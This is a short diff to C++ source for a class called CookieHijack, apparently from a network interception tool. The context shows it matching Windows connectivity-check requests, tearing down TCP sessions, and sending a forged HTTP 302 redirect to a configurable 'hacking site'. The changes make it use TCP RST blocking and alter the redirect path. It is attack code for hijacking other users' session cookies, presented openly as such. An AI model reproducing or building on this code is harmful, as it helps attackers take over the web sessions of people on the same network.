@@ -9,6 +9,7 @@ CookieHijack::CookieHijack(QObject* parent) : GGraph(parent) {
 	find_.findItems_.push_back(new GFindItem(this, 40, -1, 1, "GET /connecttest.txt HTTP/1.")); // Windows
 	find_.findItems_.push_back(new GFindItem(this, 40, -1, 1, "GET /redirect HTTP/1.")); // Windows
 
+	tcpBlock_.forwardBlockType_ = GTcpBlock::Rst;
 	tcpBlock_.backwardBlockType_ = GTcpBlock::Fin;
 	// tcpBlock_.backwardFinMsg_ // set in doOpen
 
@@ -51,6 +52,7 @@ bool CookieHijack::doOpen() {
 	httpResponse += "HTTP/1.1 302 Redirect";
 	QString locationStr =  QString("Location: http://%1.%2").arg(prefix_).arg(hackingSite_);
 	if (webServer_.httpPort_ != 80) locationStr += ":" + QString::number(webServer_.httpPort_);
+	locationStr += "/0";
 	httpResponse += locationStr;
 	httpResponse += "";
 	httpResponse += "";
